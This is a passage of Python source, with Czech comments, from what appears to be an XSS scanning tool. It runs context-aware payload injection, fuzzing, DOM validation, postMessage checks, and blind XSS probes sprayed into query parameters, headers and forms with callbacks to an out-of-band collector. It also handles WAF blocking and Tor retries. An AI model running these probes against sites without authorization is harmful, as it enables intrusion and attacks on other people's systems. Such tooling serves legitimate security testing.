                        f"[CACHE-POISON] Vulnerable: {_cpf['url'][:60]} "
                        f"(header={_cpf['header']}, {_cpf['reflection']}, "
                        f"{_cpf['severity']})", "warning")
            except Exception as _cpe:
                logging.debug(f"[CACHE-POISON] scan failed {_cpu}: {_cpe}")
        cb["on_log"](f"[OK] Cache-poisoning scan done: {_cp_hits} findings", "info")

    # ── Dangling markup scan (v10.16, high-value, opt-in) ─────────────────────
    # Scriptless HTML exfiltration (funguje i přes CSP). Běží nad param URL.
    if enable_dangling_scan and not _cancelled.is_set():
        _dm_targets = list(param_urls or [])[:_MAX_CRAWLED_VULN_URLS]
        cb["on_phase"]("dangling_markup", {"endpoints": len(_dm_targets)})
        cb["on_log"](
            f"[DANGLING] Dangling-markup scan: {len(_dm_targets)} param URLs",
            "info")
        _dm_hits = 0
        _dm_total = len(_dm_targets)
        for _didx, _du in enumerate(_dm_targets):
            if _cancelled.is_set():
                break
            cb["on_progress"](_didx + 1, _dm_total)  # live ETA
            # otestuj každý parametr v URL
            try:
                _dq = parse_qs(urlparse(_du).query, keep_blank_values=True)
                for _dp in list(_dq.keys()):
                    if _cancelled.is_set():
                        break
                    _df = scan_dangling_markup(
                        session_workers, _du, _dp, timeout, follow_redirects)
                    if _df:
                        _emit_hit(cb, _df)
                        _dm_hits += 1
                        cb["on_log"](
                            f"[DANGLING] Vulnerable: {_df['url'][:70]} "
                            f"(param={_df['param']})", "warning")
                        break  # jeden nález na URL stačí
            except Exception as _de:
                logging.debug(f"[DANGLING] scan failed {_du}: {_de}")
        cb["on_log"](f"[OK] Dangling-markup scan done: {_dm_hits} findings", "info")

    # ── SVG / XML content-type reflection scan (v10.16, high-value, opt-in) ───
    # XSS přes reflexi do image/svg+xml nebo application/xml odpovědi.
    if enable_svg_scan and not _cancelled.is_set():
        _sv_targets = list(dict.fromkeys(
            (param_urls or []) + [p for p in (pages or [])]))[:_MAX_CRAWLED_VULN_URLS]
        cb["on_phase"]("svg_xml", {"endpoints": len(_sv_targets)})
        cb["on_log"](
            f"[SVG] SVG/XML reflection scan: {len(_sv_targets)} endpoints",
            "info")
        _sv_hits = 0
        _sv_total = len(_sv_targets)
        for _sidx, _su in enumerate(_sv_targets):
            if _cancelled.is_set():
                break
            cb["on_progress"](_sidx + 1, _sv_total)  # live ETA
            try:
                _sq = parse_qs(urlparse(_su).query, keep_blank_values=True)
                _sparams = list(_sq.keys()) or ["q"]  # zkus aspoň q když bez params
                for _sp in _sparams:
                    if _cancelled.is_set():
                        break
                    _sf = scan_svg_xml_reflection(
                        session_workers, _su, _sp, timeout, follow_redirects)
                    if _sf:
                        _emit_hit(cb, _sf)
                        _sv_hits += 1
                        cb["on_log"](
                            f"[SVG] Vulnerable: {_sf['url'][:70]} "
                            f"(param={_sf['param']}, {_sf['content_type']})",
                            "warning")
                        break
            except Exception as _se:
                logging.debug(f"[SVG] scan failed {_su}: {_se}")
        cb["on_log"](f"[OK] SVG/XML reflection scan done: {_sv_hits} findings", "info")

    # ── Context-aware scan ───────────────────────────────────────────────────
    # Pro každého kandidáta z seed fáze:
    #   1. Detekuj kontext reflexe (context_probe)
    #   2. Vyber odpovídající payload bank (SCRIPT/ATTR/URL/HTML)
    #   3. Pošli cílené payloady — mnohem vyšší hit rate než slepé HTML payloady
    # Tahle fáze běží PŘED fuzz — najde reálné hits dřív než fuzzer začne
    # mutovat obecné payloady.
    if enable_context_scan and candidates and not _cancelled.is_set():
        cb["on_log"](f"Context-aware scan: {len(candidates)} candidates", "info")
        cb["on_phase"]("context", {"candidates": len(candidates)})
        seen_pairs_ctx: set = set()
        ctx_hits = 0
        ctx_total = 0

        # v10.52 PERF: the context scan was the ONLY major phase running fully
        # SERIAL (one candidate, one payload at a time) — it dominated total
        # scan time (~90%+). Parallelize ACROSS candidates, exactly like every
        # other phase (ThreadPoolExecutor min(workers,20)). Each candidate keeps
        # its per-candidate early-break on the first reflecting payload, so the
        # work per candidate is unchanged; only candidates now run concurrently.
        # _emit_hit / found_params are already lock-guarded and session_workers
        # is used concurrently by other phases, so this is thread-safe; dedup
        # yields the SAME finding set regardless of completion order. `workers`
        # stays the politeness throttle (low for WAF/recon presets).
        _ctx_cands = []
        for cand in candidates:
            key = (cand["url"], cand["param"])
            if key in seen_pairs_ctx:
                continue
            seen_pairs_ctx.add(key)
            _ctx_cands.append(cand)

        def _scan_one_ctx(cand):
            """Scan one candidate (probe → context payloads → reflect → emit).
            Returns (hits, attempts). Mirrors the old per-candidate body."""
            if _cancelled.is_set():
                return (0, 0)
            url_c, param_c = cand["url"], cand["param"]
            # v10.16: detect ALL reflection contexts (escaped in body AND raw in
            # <script>, …), union the payload banks (dedup), riskiest first.
            ctx_list = context_probe_multi(
                session_workers, url_c, param_c, timeout, follow_redirects)
            if not ctx_list:
                ctx_list = ["html"]
            ctx_payloads = []
            _seen_pl: set = set()
            for _ctx in ctx_list:
                for _pl in get_context_payloads(_ctx):
                    if _pl not in _seen_pl:
                        _seen_pl.add(_pl)
                        ctx_payloads.append(_pl)
            ctx = "+".join(ctx_list)
            cb["on_log"](f"  → {param_c} @ {url_c[:60]}... ctx={ctx} payloads={len(ctx_payloads)}", "debug")
            _hits = _att = 0
            for pld in ctx_payloads:
                if _cancelled.is_set():
                    break
                _att += 1
                marker = random_marker(10) if marker_enabled else ""
                pld_with_marker = pld.replace("XSS", marker) if marker and "XSS" in pld else pld
                test_url = inject_into_params(url_c, param_c, pld_with_marker)
                if not test_url:
                    continue
                resp_c = _fetch_with_tor_retry(
                    session_workers, test_url, timeout,
                    follow_redirects=follow_redirects, max_attempts=2)
                # Preserve politeness: each worker spaces its own requests, so the
                # WAF/Recon presets (low workers + sleep_between) stay slow even
                # though candidates now run concurrently.
                if sleep_between > 0:
                    time.sleep(sleep_between)
                if resp_c is None:
                    continue
                body_c = resp_c.text or ""
                det = detect_reflection(body_c, pld_with_marker, marker or None)
                if det["reflected"] and det["kind"] in ("exact", "partial_lt", "partial_gt", "whitespace_changed"):
                    final_ctx = classify_reflection_context(body_c, pld_with_marker, marker or None)
                    if final_ctx in ("html_escaped", "html_comment", "js_string"):
                        continue
                    with found_lock:
                        already = (url_c, param_c) in found_params
                        found_params.add((url_c, param_c))
                    results.append({
                        "url": test_url, "param": param_c,
                        "status": resp_c.status_code, "body_len": len(body_c),
                        "source": "context", "payload": pld_with_marker,
                        "context": final_ctx or ctx, "probe_context": ctx,
                        "reflection_kind": det["kind"],
                        "sanitization": det["sanitization_note"],
                    })
                    if not already:
                        _hits += 1
                        _emit_hit(cb, {
                            "url": test_url, "param": param_c,
                            "context": final_ctx or ctx,
                            "csp_note": csp_affects_finding(csp_result, final_ctx),
                            "status": resp_c.status_code, "source": "context",
                            "payload": pld_with_marker,
                        }, body=body_c,
                           resp_headers=getattr(resp_c, "headers", None),
                           run_active_probe=True)
                        cb["on_log"](f"[CTX HIT] {url_c} param:{param_c} ctx:{final_ctx} kind:{det['kind']}", "info")
                    break  # one finding per param is enough
            return (_hits, _att)

        with _bar(len(_ctx_cands), title="Context scan", spinner="dots_waves") as bar:
            with ThreadPoolExecutor(max_workers=max(1, min(workers, 20))) as _ctx_ex:
                _ctx_futs = [_ctx_ex.submit(_scan_one_ctx, c) for c in _ctx_cands]
                for _cf in as_completed(_ctx_futs):
                    if _cancelled.is_set():
                        break
                    try:
                        _h, _a = _cf.result()
                        ctx_hits += _h
                        ctx_total += _a
                    except Exception:
                        pass
                    bar()

        cb["on_log"](f"[OK] Context scan done: {ctx_hits} hits / {ctx_total} attempts", "info")

    # ── Fuzz fáze ─────────────────────────────────────────────────────────────
    if enable_fuzz and candidates and not _cancelled.is_set():
      try:
        cb["on_log"](f"Fuzz phase: {len(candidates)} candidates | budget {fuzz_budget_secs}s", "info")
        cb["on_phase"]("fuzz", {"candidates": len(candidates)})
        # Progress pro GUI (ETA v fuzz fázi)
        fuzz_total = max(1, len(candidates) * min(fuzz_iters, 50))
        fuzz_done = 0
        cb["on_progress"](0, fuzz_total)

        # Persistent corpus pro learning napříč scany
        corpus_path = Path.home() / ".xss_grenade" / "fuzz_corpus.json"
        try:
            fuzzer = Fuzzer(base_payloads=payloads, corpus_path=corpus_path)
        except Exception as e:
            cb["on_log"](f"[!] Fuzzer corpus corrupted ({e}), running without a corpus", "warn")
            try:
                fuzzer = Fuzzer(base_payloads=payloads, corpus_path=None)
            except Exception as e2:
                cb["on_log"](f"[!] Cannot start the fuzzer: {e2}. Skipping the fuzz phase.", "warn")
                fuzzer = None

        if fuzzer is not None:
            t_end      = time.time() + fuzz_budget_secs
            seen_pairs: set = set()

            with _bar(fuzz_total, title="Fuzzing", spinner="dots_waves") as bar:
                for cand in candidates:
                    if time.time() > t_end or _cancelled.is_set(): break
                    url_c, param_c = cand["url"], cand["param"]
                    if (url_c, param_c) in seen_pairs: continue
                    seen_pairs.add((url_c, param_c))
                    # Context cache: jeden probe per (url, param)
                    try:
                        # v10.34: nejdřív rich kontext (naplní i string ctx cache)
                        # → breakout synthesis přesně cílená na (tag, quote, sub).
                        _rich = fuzzer.get_rich_context(
                            session_main, url_c, param_c, timeout,
                            follow_redirects, probe_enabled=fuzz_ctx_probe)
                        n_synth = fuzzer.prime_synth(_rich, canary="1")
                        if n_synth:
                            cb["on_log"](
                                f"[SYNTH] {param_c}: {n_synth} targeted breakout "
                                f"payloads from the parsed context", "debug")
                        ctx = fuzzer.get_context(session_main, url_c, param_c, timeout, follow_redirects, probe_enabled=fuzz_ctx_probe)
                    except Exception as e:
                        cb["on_log"](f"[!] Fuzz probe error for {param_c}: {e}", "debug")
                        ctx = "html"
                    hits_for_param = 0
                    iter_count     = 0
                    # WAF/rate-limit detection — pokud server začne masivně blokovat,
                    # zpomalíme nebo úplně abort pro tenhle param.
                    blocked_streak = 0      # počet blocků v řadě (reset při úspěšném 200)
                    blocked_total = 0       # celkový počet blocků pro tenhle param
                    current_sleep = sleep_between  # lokální sleep, násobíme při throttlingu
                    waf_aborted = False     # pokud True, skipujeme další iterace
                    while iter_count < fuzz_iters and time.time() < t_end and hits_for_param < fuzz_topn and not _cancelled.is_set() and not waf_aborted:
                        try:
                            batch_list = list(fuzzer.batch(ctx, n=fuzz_batch))
                        except Exception as e:
                            cb["on_log"](f"[!] Fuzz batch error: {e}", "debug")
                            break
                        for base_p, mut_p, ops in batch_list:
                            if waf_aborted:
                                break
                            iter_count += 1
                            fuzz_done += 1
                            if fuzz_done % 10 == 0:
                                cb["on_progress"](fuzz_done, fuzz_total)
                            try:
                                test_url = inject_into_params(url_c, param_c, mut_p)
                                if not test_url:
                                    bar()
                                    continue
                                fuzz_r = _fetch_with_tor_retry(session_workers, test_url, timeout, follow_redirects=follow_redirects, max_attempts=2)
                                bar()
                                if fuzz_r is None:
                                    fuzzer.record_result(ops, was_hit=False)
                                    # Timeout/connection error taky počítáme jako blok
                                    blocked_streak += 1
                                    blocked_total += 1
                                else:
                                    # WAF/rate-limit detekce — statusy které značí block
                                    is_blocked = (
                                        fuzz_r.status_code in (403, 406, 429, 503) or
                                        (fuzz_r.status_code in (200, 202) and fingerprint_waf(fuzz_r) is not None)
                                    )
                                    if is_blocked:
                                        blocked_streak += 1
                                        blocked_total += 1
                                    else:
                                        # Reset streaku na úspěch
                                        if blocked_streak > 0:
                                            blocked_streak = 0

                                    body = fuzz_r.text or ""
                                    reflected = body_contains_reflection(body, mut_p, None)
                                    # v10.33: fuzz nález teď prochází _emit_hit
                                    # (dedup → v2 gate → render probe → emit), takže
                                    # se k němu chová stejná precision vrstva jako ke
                                    # všem ostatním (a headless verify ho promuje/
                                    # demotuje dle v10.32). Reward banditu = PROŠLO
                                    # GATE (emitted), ne syrová reflexe — tím se
                                    # fuzzer učí k EXPLOITABILITĚ, ne k zrcadlení.
                                    emitted = False
                                    if reflected:
                                        try:
                                            minimal = minimize_payload(
                                                session_workers, url_c, param_c,
                                                mut_p, timeout, follow_redirects)
                                        except Exception:
                                            minimal = mut_p
                                        _fuzz_hit = {
                                            "url": test_url, "param": param_c,
                                            "status": fuzz_r.status_code,
                                            "body_len": len(body),
                                            "source": "fuzz",
                                            "payload": mut_p,
                                            "payload_mutated": mut_p,
                                            "payload_base": base_p,
                                            "mutations": ops,
                                            "minimal_poc": minimal, "context": ctx,
                                        }
                                        try:
                                            emitted = _emit_hit(
                                                cb, _fuzz_hit, body=body,
                                                resp_headers=getattr(
                                                    fuzz_r, "headers", None),
                                                run_active_probe=True)
                                        except Exception as _ee:
                                            cb["on_log"](
                                                f"[!] Fuzz emit error: {_ee}",
                                                "debug")
                                            emitted = False
                                        if emitted:
                                            # _emit_hit anotoval _fuzz_hit gate poli
                                            # in-place → přidáním do results se z něj
                                            # (pokud gate_klass=xss_executable) stane
                                            # headless kandidát s ref na týž objekt.
                                            results.append(_fuzz_hit)
                                            fuzzer.record_hit(base_p, mut_p, ops, ctx)
                                            with found_lock:
                                                found_params.add((url_c, param_c))
                                            hits_for_param += 1
                                            cb["on_log"](
                                                f"[FUZZ HIT] {url_c} param:{param_c} "
                                                f"ctx:{ctx} ops:{','.join(ops)}",
                                                "info")
                                    # bandit reward: emitted (prošlo gate) > reflexe
                                    fuzzer.record_result(ops, was_hit=emitted)
                                    if emitted and hits_for_param >= fuzz_topn:
                                        break

                                # Po každém request check WAF thresholds
                                if blocked_streak == 20:
                                    # 20 blocků v řadě → zpomal 5×
                                    current_sleep = max(current_sleep, 0.1) * 5
                                    cb["on_log"](f"[!] WAF/rate-limit detected ({blocked_total} blocks), slowing down to {current_sleep:.1f}s", "warn")
                                elif blocked_streak == 40:
                                    # 40 blocků v řadě → úplně skipni tento param
                                    cb["on_log"](f"[STOP] WAF blocks everything for {param_c}, aborting fuzz for this param", "warn")
                                    waf_aborted = True
                                    break
                            except Exception as e:
                                cb["on_log"](f"[!] Fuzz iter error: {e}", "debug")
                                bar()
                                continue
                            # Lokální sleep (mezi iteracemi — respektuje throttling)
                            if current_sleep > 0:
                                time.sleep(current_sleep)
                    if sleep_between > 0: time.sleep(sleep_between)

            # Persistuj learned corpus pro příští scan
            try:
                fuzzer.save_corpus()
                cb["on_log"](f"Fuzz corpus saved: {len(fuzzer._learned)} successful payloads", "info")
            except Exception as _e:
                cb["on_log"](f"[!] Cannot save the fuzz corpus: {_e}", "warn")
      except Exception as e:
        cb["on_log"](f"[!] Fuzz phase crashed: {e}. Continuing.", "warn")

    # ── DOM dynamic ───────────────────────────────────────────────────────────
    dom_dyn_results: List[Dict] = []
    if dom_dynamic and candidates and not _cancelled.is_set():
      try:
        cb["on_log"](f"DOM dynamic validation: {len(candidates)} candidates | budget {dom_budget_secs}s", "info")
        cb["on_phase"]("dom", {"candidates": len(candidates)})

        # Progress pro GUI
        dom_total = max(1, len(candidates))
        dom_done = 0
        cb["on_progress"](0, dom_total)

        t_end      = time.time() + dom_budget_secs
        seen_pairs = set()

        # DOMValidator otevře browser jen JEDNOU a recykluje context
        # přes všechny kandidáty — 5-6× rychlejší než per-call launch.
        with DOMValidator(verify_ssl=verify_ssl) as validator:
            if not validator.available:
                cb["on_log"](f"[!] DOM validator not available: {validator.init_error}", "warn")
                cb["on_log"]("   Tip: pip install playwright && playwright install chromium", "info")
            else:
                cb["on_log"]("Browser started (persistent context)", "info")
                with _bar(len(candidates), title="DOM validation", spinner="dots_waves") as bar:
                    for cand in candidates:
                        if time.time() > t_end or _cancelled.is_set():
                            break
                        url_c, param_c = cand["url"], cand["param"]
                        if (url_c, param_c) in seen_pairs:
                            bar()
                            dom_done += 1
                            continue
                        seen_pairs.add((url_c, param_c))

                        try:
                            # Použij kontext z kandidáta (pokud dostupný)
                            # a nechej DOMValidator zkusit 3 nejlepší payloady
                            # z context-specific banky. Mnoho cílů chytne už
                            # prvním payloadem — ostatní se neposlat.
                            cand_ctx = cand.get("context") or cand.get("reason", "")
                            # Zkus extrahovat context z reason (např. "Sanitized (html_escaped)")
                            if not cand_ctx or "Sanitized" in cand_ctx:
                                cand_ctx = "html_body"  # default fallback

                            domres = validator.validate_multi(
                                url_c, param_c,
                                context=cand_ctx,
                                max_payloads=3,
                                wait_secs=dom_wait,
                            )
                            dom_dyn_results.append({"url": url_c, "param": param_c, **domres})

                            if domres.get("triggered") or domres.get("saw_marker"):
                                with found_lock:
                                    found_params.add((url_c, param_c))
                                results.append({
                                    "url":             domres.get("test_url"),
                                    "param":           param_c,
                                    "status":          None,
                                    "body_len":        None,
                                    "source":          "dom-dynamic",
                                    "dom_dialog":      domres.get("dialog"),
                                    "dom_dialog_msg":  domres.get("dialog_message"),
                                    "dom_marker_seen": domres.get("saw_marker", False),
                                    "dom_sinks":       domres.get("sinks_hit", []),
                                    "csp_violations":  domres.get("csp_violations", []),
                                })
                                sinks_str = ",".join(s.get("sink", "?") for s in (domres.get("sinks_hit") or []))
                                payload_used = domres.get("payload_used", "<img src=x onerror=alert('XSS')>")
                                cb["on_log"](f"[DOM-XSS] {url_c} param:{param_c} sinks:{sinks_str} payload:{payload_used[:60]}", "info")
                                # DOM XSS is already verified by browser (dialog fired or sink hit).
                                # Skip body-based gate; rely on dedup only.
                                _emit_hit(cb, {
                                    "url":      domres.get("test_url"),
                                    "param":    param_c,
                                    "context":  f"dom-dynamic ({cand_ctx})",
                                    "csp_note": csp_affects_finding(csp_result, "dom"),
                                    "status":   "DOM",
                                    "source":   "dom",
                                    "payload":  payload_used,
                                    "dom_verified": True,
                                })
                            elif domres.get("csp_violations"):
                                # CSP blokování — informativně, ne hit
                                cb["on_log"](f"CSP blokoval DOM validaci: {url_c} param:{param_c}", "info")
                        except Exception as e:
                            cb["on_log"](f"[!] DOM validation error for {param_c}: {e}", "debug")
                        finally:
                            bar()
                            dom_done += 1
                            if dom_done % 2 == 0:
                                cb["on_progress"](dom_done, dom_total)
      except Exception as e:
        cb["on_log"](f"[!] DOM phase crashed: {e}", "warn")
        cb["on_log"]("   Tip: nainstaluj Playwright: pip install playwright && playwright install chromium", "info")

    # ── Blind XSS (Out-of-Band) ──────────────────────────────────────────────
    blind_xss_injections: List[Dict] = []
    if enable_blind_xss and blind_oob_url and not _cancelled.is_set():
      if _BLIND_OOB_AVAILABLE and _BlindOrch is not None:
        # ── v10.47: korelovaná OOB blind XSS (per-token, exfil, is_blind) ──
        try:
            cb["on_log"](f"Blind XSS (correlated OOB) → collector {blind_oob_url}", "info")
            cb["on_phase"]("blind_xss", {"oob_url": blind_oob_url})
            _orch = _BlindOrch(_OOBConfig(collector_url=blind_oob_url))

            def _spray(u, param, vector, send):
                """Zaregistruje payloady a každý pošle přes send(payload)."""
                for rec in _orch.payloads_for(u, param, vector, "generic"):
                    if _cancelled.is_set():
                        break
                    try:
                        send(rec.payload)
                        blind_xss_injections.append({
                            "token": rec.token, "url": u, "param": param,
                            "vector": vector, "payload": rec.payload})
                    except Exception:
                        pass
                    if sleep_between > 0:
                        time.sleep(sleep_between)

            # 1) query parametry
            for purl in list(param_urls)[:200]:
                if _cancelled.is_set():
                    break
                try:
                    _pq = parse_qs(urlparse(purl).query)
                except Exception:
                    _pq = {}
                for pname in _pq.keys():
                    _spray(purl, pname, "query",
                           lambda pl, _u=purl, _p=pname: session_workers.get(
                               inject_into_params(_u, _p, pl, extra_params=None) or _u,
                               timeout=timeout, allow_redirects=follow_redirects))

            # 2) reflektovatelné hlavičky (User-Agent / Referer / X-Forwarded-*)
            if blind_headers:
                _btargets = list(dict.fromkeys([target] + list(param_urls)[:30]))
                for _bt in _btargets:
                    if _cancelled.is_set():
                        break
                    for _hn in ("User-Agent", "Referer", "X-Forwarded-For",
                                "X-Forwarded-Host"):
                        _spray(_bt, f"header:{_hn}", "header",
                               lambda pl, _u=_bt, _h=_hn: session_workers.get(
                                   _u, timeout=timeout,
                                   allow_redirects=follow_redirects,
                                   headers={_h: pl}))

            # 3) formuláře (text/textarea pole → POST)
            for _bp in (pages[:50] if pages else [target]):
                if _cancelled.is_set():
                    break
                _pr = _fetch_with_tor_retry(session_workers, _bp, timeout,
                                            follow_redirects=follow_redirects,
                                            max_attempts=2)
                _phtml = (_pr.text or "") if _pr else ""
                for _form in _extract_forms_blind(_phtml, _bp):
                    _action = _form.get("action") or _bp
                    _method = (_form.get("method") or "get").lower()
                    _fields = {i.get("name"): "test" for i in _form.get("inputs", [])
                               if i.get("name") and (i.get("type") or "text") in
                               ("text", "search", "textarea", "url", "", "email")}
                    if not _fields:
                        continue
                    for _fn in list(_fields.keys()):
                        def _send_form(pl, _a=_action, _m=_method, _fl=dict(_fields), _k=_fn):
                            _fl2 = dict(_fl); _fl2[_k] = pl
                            if _m == "post":
                                session_workers.post(_a, data=_fl2, timeout=timeout,
                                                     allow_redirects=follow_redirects)
                            else:
                                session_workers.get(_a, params=_fl2, timeout=timeout,
                                                    allow_redirects=follow_redirects)
                        _spray(_action, f"form:{_fn}", "form", _send_form)

            # zapiš injection mapu (pro pozdější korelaci — OOB je async)
            if blind_map_path:
                try:
                    import json as _json
                    with open(blind_map_path, "w", encoding="utf-8") as _mf:
                        _json.dump(_orch.export_map(), _mf, ensure_ascii=False, indent=2)
                    cb["on_log"](f"[BLIND] injection mapa → {blind_map_path}", "info")
                except Exception as _me:
                    cb["on_log"](f"[BLIND] map write failed: {_me}", "warn")

            cb["on_log"](
                f"[OK] Blind XSS: {len(blind_xss_injections)} correlated probes "
                f"seeded (query+header+form) → collector {blind_oob_url}", "info")

            # volitelný poll collectoru (rychle-vystřelující blind XSS, např. log viewer)
            if blind_poll_secs and blind_poll_secs > 0:
                _results_url = blind_oob_url.rstrip("/") + "/results"
                cb["on_log"](f"[BLIND] poll collectoru {blind_poll_secs:.0f}s "
                             f"({_results_url})…", "info")
                _deadline = time.time() + blind_poll_secs
                _seen_tok = set()
                while time.time() < _deadline and not _cancelled.is_set():
                    try:
                        _rr = session_main.get(_results_url, timeout=timeout)
                        _cbs = _rr.json() if _rr is not None else []
                    except Exception:
                        _cbs = []
                    for _bf in _orch.correlate(_cbs):
                        if _bf.token in _seen_tok:
                            continue
                        _seen_tok.add(_bf.token)
                        _hd = {
                            "url": _bf.injection_url, "param": _bf.param,
                            "context": (f"BLIND XSS (OOB confirmed) — injektnuto "
                                        f"přes {_bf.vector} '{_bf.param}', VYSTŘELILO "
                                        f"v {_bf.fired_at_url[:80]}"),
                            "status": 200, "source": "blind-oob",
                            "payload": _bf.payload,
                        }
                        _apply_headless_verdict(_hd, executed=True, status="executed",
                                                kind="blind", evidence=_bf.fired_at_url)
                        _emit_hit(cb, _hd)
                        cb["on_log"](
                            f"[BLIND ✓ OOB CONFIRMED] {_bf.param} → fired in "
                            f"{_bf.fired_at_url[:60]} (blind={_bf.is_blind})", "info")
                    time.sleep(min(3.0, blind_poll_secs / 5 if blind_poll_secs > 5 else 1.0))
        except Exception as e:
            cb["on_log"](f"[!] Blind XSS (OOB) phase crashed: {e}", "warn")
      else:
        # ── legacy fallback (bez korelace) ──
        try:
            cb["on_log"](f"Blind XSS scan: OOB callback → {blind_oob_url}", "info")
            cb["on_phase"]("blind_xss", {"oob_url": blind_oob_url})
            blind_targets = list(set(
                [urlunparse(urlparse(u)._replace(query="", fragment="")) for u in param_urls]
                + [target] + (pages[:50] if pages else [])))
            for page_url in blind_targets:
                if _cancelled.is_set():
                    break
                page_r = _fetch_with_tor_retry(
                    session_workers, page_url, timeout,
                    follow_redirects=follow_redirects, max_attempts=2)
                page_html = (page_r.text or "") if page_r else ""
                injections = inject_blind_xss(
                    session=session_workers, url=page_url, html=page_html,
                    oob_url=blind_oob_url, timeout=timeout,
                    follow_redirects=follow_redirects,
                    sleep_between=sleep_between, cb=cb)
                blind_xss_injections.extend(injections)
                if sleep_between > 0:
                    time.sleep(sleep_between)
            cb["on_log"](
                f"[OK] Blind XSS done: {len(blind_xss_injections)} payloads injected\n"
                f"   → Check the callback server ({blind_oob_url}) to confirm hits.", "info")
        except Exception as e:
            cb["on_log"](f"[!] Blind XSS phase crashed: {e}", "warn")

    # ── postMessage XSS ──────────────────────────────────────────────────────
    postmessage_static_findings: List[Dict] = []
    postmessage_dynamic_findings: List[Dict] = []
    if enable_postmessage_scan and not _cancelled.is_set():
      try:
        cb["on_log"]("postMessage XSS scan...", "info")
        cb["on_phase"]("postmessage", {})

        # Statická analýza — hledej postMessage listenery na hlavní stránce
        postmessage_static_findings = static_postmessage_scan(
            session_workers, html, target, timeout
        )

        # Rozšíř na crawlované stránky (max 20)
        pm_extra_pages = (pages[:50] if pages else [])  # v10.52: 20→50, cache-backed (free)
        pm_done = 0
        pm_total = len(pm_extra_pages) + 1  # +1 za target

        for pm_page in pm_extra_pages:
            if _cancelled.is_set():
                break
            pm_done += 1
            cb["on_progress"](pm_done, pm_total)
            try:
                _pm_html = _crawl_html(pm_page)   # v10.52: reuse crawl cache
                if _pm_html is not None:
                    pm_findings = static_postmessage_scan(
                        session_workers, _pm_html, pm_page, timeout
                    )
                    postmessage_static_findings.extend(pm_findings)
            except _NET_EXCEPTIONS:
                continue

        if postmessage_static_findings:
            critical_pm = [f for f in postmessage_static_findings if f.get("severity") == "CRITICAL"]
            cb["on_log"](
                f"postMessage static: {len(postmessage_static_findings)} listeners found "
                f"({len(critical_pm)} CRITICAL — no origin check + sink)",
                "info"
            )

            # Reportuj CRITICAL findings jako hity
            for pm_f in critical_pm:
                # Pro static findings "payload" = snippet listeneru nebo sink info
                static_payload = pm_f.get("snippet") or pm_f.get("handler") or \
                                 f"postMessage handler without origin check → sink: {pm_f.get('sink_type', '?')}"
                _emit_hit(cb, {
                    "url":      pm_f.get("where", target),
                    "param":    "postMessage",
                    "context":  f"postMessage-static (sink: {pm_f.get('sink_type', '?')})",
                    "csp_note": csp_affects_finding(csp_result, "dom"),
                    "status":   "STATIC",
                    "source":   "postmessage-static",
                    "payload":  static_payload,
                })
                with found_lock:
                    found_params.add((pm_f.get("where", target), "postMessage"))

            # Dynamická validace — Playwright (jen pokud DOM dynamic je povoleno)
            if dom_dynamic and critical_pm:
                cb["on_log"](f"postMessage dynamic validation ({len(critical_pm)} candidates)...", "info")
                # Validuj jen stránky s CRITICAL findings
                pm_urls_to_validate = list(set(f.get("where", target) for f in critical_pm))
                for pm_url in pm_urls_to_validate[:5]:  # max 5 stránek
                    if _cancelled.is_set():
                        break
                    # Pro inline skripty použij target URL
                    test_url = pm_url if pm_url.startswith("http") else target
                    pm_dyn = dynamic_postmessage_scan(
                        test_url, wait_secs=dom_wait, timeout_secs=dom_budget_secs
                    )
                    postmessage_dynamic_findings.extend(pm_dyn)

                    # Vyhodnoť dynamické výsledky
                    for pm_d in pm_dyn:
                        if pm_d.get("triggered"):
                            sinks_str = ",".join(
                                s.get("sink", "?") for s in (pm_d.get("sinks_hit") or [])
                            )
                            cb["on_log"](
                                f"[postMessage XSS] {test_url} | "
                                f"sinks: {sinks_str} | payload: {pm_d.get('payload', '')[:80]}",
                                "info"
                            )
                            _emit_hit(cb, {
                                "url":      test_url,
                                "param":    "postMessage",
                                "context":  f"postMessage-dynamic (sinks: {sinks_str})",
                                "csp_note": csp_affects_finding(csp_result, "dom"),
                                "status":   "DOM",
                                "source":   "postmessage-dynamic",
                                "payload":  pm_d.get("payload", ""),
                                "dom_verified": True,
                            })
                            with found_lock:
                                found_params.add((test_url, "postMessage"))
                            results.append({
                                "url":    test_url,
                                "param":  "postMessage",
                                "status": "DOM",
                                "source": "postmessage-dynamic",
                                "payload": pm_d.get("payload", ""),
                                "sinks_hit": pm_d.get("sinks_hit", []),
                            })

        else:
            cb["on_log"]("postMessage: no listeners found", "info")

      except Exception as e:
        cb["on_log"](f"[!] postMessage phase crashed: {e}", "warn")

    # ── WebSocket XSS ────────────────────────────────────────────────────────
    websocket_static_findings: List[Dict] = []
    websocket_dynamic_findings: List[Dict] = []
    mutation_xss_findings: List[Dict] = []
    template_injection_findings: List[Dict] = []
    if enable_websocket_scan and not _cancelled.is_set():
      try:
        cb["on_log"]("WebSocket XSS scan...", "info")
        cb["on_phase"]("websocket", {})

        # Statická analýza
        websocket_static_findings = static_websocket_scan(
            session_workers, html, target, timeout
        )

        # Rozšíř na crawlované stránky
        ws_extra_pages = (pages[:50] if pages else [])  # v10.52: 20→50, cache-backed (free)
        for ws_page in ws_extra_pages:
            if _cancelled.is_set():
                break
            try:
                _ws_html = _crawl_html(ws_page)   # v10.52: reuse crawl cache
                if _ws_html is not None:
                    ws_findings = static_websocket_scan(
                        session_workers, _ws_html, ws_page, timeout
                    )
                    websocket_static_findings.extend(ws_findings)
            except _NET_EXCEPTIONS:
                continue

        if websocket_static_findings:
            high_ws = [f for f in websocket_static_findings if f.get("severity") == "HIGH"]
            cb["on_log"](
                f"WebSocket static: {len(websocket_static_findings)} WS handlers found "
                f"({len(high_ws)} HIGH — message handler + sink)",
                "info"
            )

            # Reportuj HIGH findings
            for ws_f in high_ws:
                ws_url_info = ws_f.get("ws_url") or "?"
                static_payload_ws = ws_f.get("snippet") or ws_f.get("handler") or \
                                    f"WebSocket onmessage handler with unsafe sink → {ws_f.get('sink_type', '?')}"
                _emit_hit(cb, {
                    "url":      ws_f.get("where", target),
                    "param":    f"WebSocket ({ws_url_info})",
                    "context":  f"websocket-static (sink: {ws_f.get('sink_type', '?')})",
                    "csp_note": csp_affects_finding(csp_result, "dom"),
                    "status":   "STATIC",
                    "source":   "websocket-static",
                    "payload":  static_payload_ws,
                })
                with found_lock:
                    found_params.add((ws_f.get("where", target), "WebSocket"))

            # Dynamická validace (Playwright)
            if dom_dynamic and websocket_static_findings:
                cb["on_log"]("WebSocket dynamic validation...", "info")
                # Sbírej WS URL z static findings
                discovered_ws_urls = []
                for ws_f in websocket_static_findings:
                    for wu in (ws_f.get("ws_urls_found") or []):
                        if wu not in discovered_ws_urls:
                            discovered_ws_urls.append(wu)

